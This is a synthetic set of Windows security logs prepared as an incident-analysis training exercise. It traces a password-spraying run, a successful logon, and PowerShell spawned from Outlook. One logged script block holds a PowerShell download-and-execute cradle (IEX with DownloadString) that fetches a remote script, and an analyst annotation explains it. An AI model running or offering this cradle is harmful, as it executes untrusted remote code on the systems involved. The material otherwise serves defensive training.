# Synthetic Raw Windows Security Logs — INC-005

> **Training data:** All events below are synthetic and created for this portfolio exercise. They are formatted to resemble analyst-readable Windows event telemetry but are not exported from a real Windows environment.

---

# Domain Controller — Authentication Events

## Event 4625 — Failed Logon

```text
Provider:       Microsoft-Windows-Security-Auditing
Event ID:       4625
Level:          Information
Computer:       RG-DC-01.redgum.local

TimeCreated:    2026-07-31 21:13:58 AEST

Subject:
    Security ID:        REDGUM\SYSTEM
    Account Name:       RG-DC-01$

Account For Which Logon Failed:
    Account Name:       a.wilson
    Account Domain:     REDGUM

Failure Information:
    Failure Reason:     Unknown user name or bad password
    Status:             0xC000006D
    Sub Status:         0xC000006A

Logon Type:             3
Authentication Package: NTLM

Network Information:
    Workstation Name:   RG-LAPTOP-12
    Source Network Addr:192.168.1.44
    Source Port:        51422
```

---

## Event 4625 — Failed Logon

```text
Provider:       Microsoft-Windows-Security-Auditing
Event ID:       4625
Computer:       RG-DC-01.redgum.local

TimeCreated:    2026-07-31 21:14:01 AEST

Account Name:       m.chen
Account Domain:     REDGUM

Failure Reason:     Unknown user name or bad password
Status:             0xC000006D
Sub Status:         0xC000006A

Logon Type:         3
Authentication:     NTLM

Workstation:        RG-LAPTOP-12
Source Address:     192.168.1.44
Source Port:        51423
```

---

## Event 4625 — Failed Logon

```text
Provider:       Microsoft-Windows-Security-Auditing
Event ID:       4625
Computer:       RG-DC-01.redgum.local

TimeCreated:    2026-07-31 21:14:02 AEST

Account Name:       j.smith
Account Domain:     REDGUM

Failure Reason:     Unknown user name or bad password
Status:             0xC000006D
Sub Status:         0xC000006A

Logon Type:         3
Authentication:     NTLM

Workstation:        RG-LAPTOP-12
Source Address:     192.168.1.44
Source Port:        51424
```

---

## Event 4625 — Failed Logon

```text
Provider:       Microsoft-Windows-Security-Auditing
Event ID:       4625
Computer:       RG-DC-01.redgum.local

TimeCreated:    2026-07-31 21:14:05 AEST

Account Name:       r.brown
Account Domain:     REDGUM

Failure Reason:     Unknown user name or bad password
Status:             0xC000006D
Sub Status:         0xC000006A

Logon Type:         3
Authentication:     NTLM

Workstation:        RG-LAPTOP-12
Source Address:     192.168.1.44
Source Port:        51425
```

---

## Event 4625 — Failed Logon

```text
Provider:       Microsoft-Windows-Security-Auditing
Event ID:       4625
Computer:       RG-DC-01.redgum.local

TimeCreated:    2026-07-31 21:14:08 AEST

Account Name:       j.smith
Account Domain:     REDGUM

Failure Reason:     Unknown user name or bad password
Status:             0xC000006D
Sub Status:         0xC000006A

Logon Type:         3
Authentication:     NTLM

Workstation:        RG-LAPTOP-12
Source Address:     192.168.1.44
Source Port:        51426
```

---

## Event 4625 — Failed Logon

```text
Provider:       Microsoft-Windows-Security-Auditing
Event ID:       4625
Computer:       RG-DC-01.redgum.local

TimeCreated:    2026-07-31 21:14:11 AEST

Account Name:       s.patel
Account Domain:     REDGUM

Failure Reason:     Unknown user name or bad password
Status:             0xC000006D
Sub Status:         0xC000006A

Logon Type:         3
Authentication:     NTLM

Workstation:        RG-LAPTOP-12
Source Address:     192.168.1.44
Source Port:        51427
```

---

# Event 4624 — Successful Logon

```text
Provider:       Microsoft-Windows-Security-Auditing
Event ID:       4624
Computer:       RG-DC-01.redgum.local

TimeCreated:    2026-07-31 21:14:15 AEST

Account:
    Account Name:       r.brown
    Account Domain:     REDGUM

Logon Information:
    Logon Type:         3
    Authentication:     NTLM
    Logon ID:           0x7A31C4

Network Information:
    Workstation Name:   RG-LAPTOP-12
    Source Address:     192.168.1.44
    Source Port:        51428
```

---

# Endpoint — Process Creation

## Event 4688 — PowerShell

```text
Provider:       Microsoft-Windows-Security-Auditing
Event ID:       4688
Computer:       RG-LAPTOP-12.redgum.local

TimeCreated:    2026-07-31 21:15:32 AEST

Subject:
    Account Name:       j.smith
    Account Domain:     REDGUM
    Logon ID:           0x6F8A91

New Process:
    Process Name:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    Process ID:         0x1D84
    Command Line:       powershell.exe -NoProfile

Creator Process:
    Process Name:       C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE
    Process ID:         0x1A20
```

> **Analyst note:** The supplied process relationship is suspicious in context but does not independently establish that Outlook was compromised or that malware was involved.

---

## Event 4688 — Command Shell

```text
Provider:       Microsoft-Windows-Security-Auditing
Event ID:       4688
Computer:       RG-LAPTOP-12.redgum.local

TimeCreated:    2026-07-31 21:15:41 AEST

Subject:
    Account Name:       j.smith
    Account Domain:     REDGUM
    Logon ID:           0x6F8A91

New Process:
    Process Name:       C:\Windows\System32\cmd.exe
    Process ID:         0x1E10
    Command Line:       cmd.exe /c whoami /all

Creator Process:
    Process Name:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    Process ID:         0x1D84
```

---

## Event 4688 — whoami

```text
Provider:       Microsoft-Windows-Security-Auditing
Event ID:       4688
Computer:       RG-LAPTOP-12.redgum.local

TimeCreated:    2026-07-31 21:16:03 AEST

Subject:
    Account Name:       j.smith
    Account Domain:     REDGUM
    Logon ID:           0x6F8A91

New Process:
    Process Name:       C:\Windows\System32\whoami.exe
    Process ID:         0x1E44
    Command Line:       whoami /all

Creator Process:
    Process Name:       C:\Windows\System32\cmd.exe
    Process ID:         0x1E10
```

---

# PowerShell Operational Log

## Event 4104 — Remote Script Retrieval

```text
Provider:       Microsoft-Windows-PowerShell
Log:            Microsoft-Windows-PowerShell/Operational
Event ID:       4104

TimeCreated:    2026-07-31 21:15:34 AEST

User:           REDGUM\j.smith
Host:           RG-LAPTOP-12.redgum.local

ScriptBlockText:

$u = "http://10.10.20.15/update.ps1"
IEX (New-Object Net.WebClient).DownloadString($u)
```

### Analyst interpretation

The command:

1. defines a remote URL;
2. retrieves the resource using `DownloadString()`;
3. passes the returned string to `IEX`;
4. causes the returned string to be interpreted as PowerShell code.

The actual remote script contents are not included in this evidence set.

---

## Event 4104 — Discovery Commands

```text
Provider:       Microsoft-Windows-PowerShell
Log:            Microsoft-Windows-PowerShell/Operational
Event ID:       4104

TimeCreated:    2026-07-31 21:15:39 AEST

User:           REDGUM\j.smith
Host:           RG-LAPTOP-12.redgum.local

ScriptBlockText:

Get-Process
Get-Service
whoami /all
```

---

# Client-Provided Asset Context

```text
Asset:
    RG-LAPTOP-12

IPv4:
    192.168.1.44

Assigned User:
    John Smith

User Confirmation:
    John Smith confirmed he was not operating the laptop
    during the 21:14–21:16 activity window.

Physical Context:
    Laptop was reported to be in the office.
```

---

# Uncorrelated Authentication Event

```text
Provider:       Microsoft-Windows-Security-Auditing
Event ID:       4624
Computer:       RG-ACCT-07.redgum.local

TimeCreated:    2026-07-31 21:18:44 AEST

Account Name:       j.smith
Account Domain:     REDGUM

Logon Type:         2
Authentication:     Negotiate

Source Address:     -
```

### Analyst note

This event is **not automatically attributed to the suspected attack**.

Additional correlation is required before including it in the attack chain.
